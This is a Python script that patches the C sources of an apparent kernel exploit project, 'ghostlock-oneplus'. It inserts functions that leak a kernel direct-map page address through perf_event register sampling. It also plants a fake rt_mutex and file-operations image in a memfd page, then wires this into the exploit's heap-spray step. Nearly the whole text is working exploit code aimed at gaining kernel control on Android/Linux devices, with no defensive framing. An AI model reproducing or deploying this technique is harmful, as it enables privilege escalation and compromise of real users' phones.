util = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
common = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
main = "/root/ghostlock/ghostlock-oneplus/src/core/main.c"

u = open(util).read()

# include perf_event
if "linux/perf_event.h" not in u:
    u = u.replace('#include "kernelsnitch/kernelsnitch.h"\n',
                  '#include "kernelsnitch/kernelsnitch.h"\n#include <linux/perf_event.h>\n', 1)
    print("include added")

if "prepare_perf_fake_page" not in u:
    funcs = r'''
/* ============================================================================
 * Direction 2: leak the direct-map address of a writable memfd (tmpfs) page
 * with perf REGS_INTR sampling, then load the fake rt_mutex image into that
 * same page.  No mm slab / SLUB release involved.
 * ========================================================================== */
static int perf_page_fd = -1;
static unsigned char *perf_page_map;

static uintptr_t leak_page_via_perf(void)
{
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;
  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (pfd < 0) { pr_warning("perf_event_open errno=%d\n", errno); return 0; }
  size_t msz = PAGE_SIZE * 33;
  unsigned char *buf = mmap(0, msz, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
  if (buf == MAP_FAILED) { pr_warning("perf mmap errno=%d\n", errno); close(pfd); return 0; }

  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  for (long i = 0; i < 500000; i++)
    pread(perf_page_fd, perf_page_map, PAGE_SIZE, 0);
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = (void *)buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  unsigned char *base = buf + PAGE_SIZE;
  size_t dsz = PAGE_SIZE * 32;
  uint64_t pos = hdr->data_tail;
  static uint64_t cand[8192];
  static int cnt[8192];
  int nc = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
      p += 8; /* ip */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32; i++) {
          uint64_t v = regs[i];
          if (v >= 0xffffffc000000000ULL && v < 0xffffffff00000000ULL &&
              (v & (PAGE_SIZE - 1)) == 0) {
            int f = -1;
            for (int k = 0; k < nc; k++) if (cand[k] == v) { f = k; break; }
            if (f < 0 && nc < 8192) { cand[nc] = v; cnt[nc] = 1; nc++; }
            else if (f >= 0) cnt[f]++;
          }
        }
      }
    }
    pos += ev->size;
  }
  munmap(buf, msz);
  close(pfd);
  int bi = -1;
  for (int k = 0; k < nc; k++) if (bi < 0 || cnt[k] > cnt[bi]) bi = k;
  if (bi < 0) { pr_warning("perf page leak: no candidate\n"); return 0; }
  pr_info("perf page leak: top=%016llx count=%d cands=%d\n",
          (unsigned long long)cand[bi], cnt[bi], nc);
  return (uintptr_t)cand[bi];
}

uintptr_t prepare_perf_fake_page(int payload_mode)
{
  if (perf_page_fd < 0) {
    perf_page_fd = (int)syscall(__NR_memfd_create, "ghostlock", 0);
    if (perf_page_fd < 0) { pr_warning("memfd_create errno=%d\n", errno); return 0; }
    if (ftruncate(perf_page_fd, PAGE_SIZE) != 0) {
      pr_warning("ftruncate errno=%d\n", errno); return 0;
    }
  }
  if (!perf_page_map) {
    perf_page_map = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, perf_page_fd, 0);
    if (perf_page_map == MAP_FAILED) {
      perf_page_map = 0; pr_warning("page mmap errno=%d\n", errno); return 0;
    }
  }
  if (!skb_buf) skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) return 0;

  memset(perf_page_map, 0x41, PAGE_SIZE);      /* fault the page-cache page in */
  uintptr_t base = leak_page_via_perf();
  if (!base) { pr_warning("perf page leak failed\n"); return 0; }

  prepare_skb_payload(base, payload_mode);     /* fills skb_buf; fake_lock==base */
  memcpy(perf_page_map, skb_buf + LOCK_OFF, PAGE_SIZE);  /* image at page offset 0 */

  pr_info("prepare_perf_fake_page ok base=%016zx lock=%016zx task=%016zx fops=%016zx\n",
          base, fake_lock, fake_task, fake_fops);
  return base;
}

'''
    anchor = "uintptr_t prepare_kernel_page(int payload_mode) {"
    assert u.count(anchor) == 1
    u = u.replace(anchor, funcs + anchor)
    print("functions added")
    open(util, "w").write(u)
else:
    print("util already patched")

# common.h: declare
c = open(common).read()
if "prepare_perf_fake_page" not in c:
    anchor = "uintptr_t prepare_good_kernel_page(int payload_mode);"
    assert c.count(anchor) == 1
    c = c.replace(anchor, anchor + "\nuintptr_t prepare_perf_fake_page(int payload_mode);")
    open(common, "w").write(c)
    print("common.h declared")
else:
    print("common already patched")

# main.c: use perf page in do_one_write
m = open(main).read()
old = ("  TIMER(\"  heap spray start\");\n"
       "  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);\n"
       "  if (!page_base) { pr_error(\"  heap spray failed\\n\"); clear_pselect_write(); return 0; }")
assert m.count(old) == 1, m.count(old)
new = ("  TIMER(\"  heap spray start\");\n"
       "  page_base = 0;\n"
       "  for (int pa = 0; pa < 8 && !page_base; pa++)\n"
       "    page_base = prepare_perf_fake_page(PAGE_PAYLOAD_FOPS);\n"
       "  if (!page_base) { pr_error(\"  fake page failed\\n\"); clear_pselect_write(); return 0; }")
m = m.replace(old, new)
open(main, "w").write(m)
print("main.c wired")
print("done")
